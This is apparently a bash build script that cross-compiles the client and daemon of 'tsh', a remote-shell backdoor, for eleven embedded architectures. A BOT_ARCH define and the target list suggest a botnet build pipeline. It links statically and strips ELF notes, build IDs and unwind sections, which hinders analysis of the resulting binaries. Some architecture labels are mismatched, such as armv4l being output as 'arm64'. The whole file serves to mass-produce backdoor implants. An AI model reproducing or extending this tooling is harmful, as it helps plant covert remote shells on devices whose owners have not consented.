#/bin/bash

#crosscompiler path
TOOLSROOT="/host_share/xcross/cross-compiler-"
DEBUGFLAG=""
function build_tsh {
    OUTFILE=$"tsh."$2
    TUPLE=$1
    TOOLS="${TOOLSROOT}${TUPLE}/bin/${TUPLE}"
    GCC=$TOOLS"-gcc"
    STRIP=$TOOLS"-strip"
    $GCC -O3 -g -D BOT_ARCH=\"$2\" $DEBUGFLAG -Wl,--gc-sections -fdata-sections -ffunction-sections -static aes.c pel.c sha1.c tsh.c -o ./bin/$OUTFILE

    $STRIP -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./bin/$OUTFILE
}

function build_tshd {
    OUTFILE=$"tshd."$2
    TUPLE=$1
    TOOLS="${TOOLSROOT}${TUPLE}/bin/${TUPLE}"
    GCC=$TOOLS"-gcc"
    STRIP=$TOOLS"-strip"
    $GCC -O3 -g -D BOT_ARCH=\"$2\" $DEBUGFLAG -Wl,--gc-sections -fdata-sections -ffunction-sections -lutil -static aes.c pel.c sha1.c tshd.c -o ./bin/$OUTFILE

    $STRIP -S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr ./bin/$OUTFILE
}


build_tsh x86_64 "x64"
build_tsh i586 "x86"
build_tsh armv4l "arm64"
build_tsh armv4l "arm"
build_tsh m68k "m68k"
build_tsh mips "mips"
build_tsh mipsel "mipsel"
build_tsh powerpc "ppc"
build_tsh powerpc "ppc64"
build_tsh sh4 "sh4"
build_tsh sparc "spc"

build_tshd x86_64 "x64"
build_tshd i586 "x86"
build_tshd armv4l "arm64"
build_tshd armv4l "arm"
build_tshd m68k "m68k"
build_tshd mips "mips"
build_tshd mipsel "mipsel"
build_tshd powerpc "ppc"
build_tshd powerpc "ppc64"
build_tshd sh4 "sh4"
build_tshd sparc "spc"
